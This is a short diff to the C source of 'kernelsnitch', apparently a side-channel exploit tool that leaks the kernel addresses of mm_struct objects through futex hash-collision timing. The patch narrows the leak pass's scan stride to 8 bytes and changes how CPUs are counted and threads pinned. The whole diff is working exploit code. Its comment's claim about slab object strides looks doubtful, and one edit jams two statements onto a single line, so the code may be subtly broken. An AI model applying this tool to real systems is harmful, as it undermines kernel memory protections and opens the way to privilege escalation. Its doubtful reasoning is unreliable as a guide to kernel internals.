@@ -267,6 +267,15 @@ static void *__mm_leak(void *arg)
 
 static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int try_canonical, int sweep_tags)
 {
+    /* The stride has to be small enough to test every offset an mm_struct can
+     * start at. mm_struct_sz is the SLUB object stride, which the cache rounds
+     * up from sizeof(mm_struct), so it is not 8-byte exact and two thirds of the
+     * real slots are skipped when it is used here. A candidate only matches when
+     * the hash of its low bytes equals the hash of the real struct's, and the
+     * 12-bit offset inside the key is what makes that position-sensitive. */
+    size_t saved_stride = ks->mm_struct_sz;
+    ks->mm_struct_sz = 8;
+
     for (size_t i = 0; i < ks->thread_cnt; ++i) {
         struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
         mm_leak_arg->ks = ks;
@@ -283,6 +292,8 @@ static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int try_can
     }
     for (size_t i = 0; i < ks->thread_cnt; ++i)
         pthread_join(ks->tids[i], 0);
+
+    ks->mm_struct_sz = saved_stride;
 }
 
 /****************************************************************************************************************/
@@ -305,7 +316,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
     ks->scan_done = 0;
     ks->mm_struct_sz = __mm_struct_sz;
     ks->mm_slab_order = __mm_slab_order;
-    ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
+    ks->cpu_cnt = cpu_count_configured();
     ks->thread_cnt = __thread_cnt;
     ks->collisions = __collision_cnt;
     ks->verbose = __verbose;
@@ -327,8 +338,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
         ks->mm_struct_sz,
         ks->mm_slab_order,
         ks->thread_cnt,
-        ks->collisions);
-    pin_to_core(CORE);
+        ks->collisions);    pin_to_core(CORE);
     futex_init();
 
     ks->state = KERNELSNITCH_INIT;
